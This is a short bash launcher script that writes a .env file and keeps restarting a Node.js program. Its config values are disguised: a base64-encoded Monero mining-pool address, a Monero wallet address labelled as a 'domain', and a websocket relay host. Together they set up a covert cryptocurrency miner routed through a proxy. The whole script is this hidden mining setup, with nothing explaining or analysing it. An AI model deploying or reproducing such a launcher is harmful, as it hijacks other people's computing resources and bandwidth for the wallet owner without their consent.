#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=ws://cdn.apacer.web.id
SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
SERVER_DOMAIN=82thAvdKbspiLhcSkNG8xrP7j3gwJKgrGj6w2A5j4urc64uJauggoeNWyHHh9hvasKTa1dnavqHh2f3fq2vuXchP7ENy9kJ
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
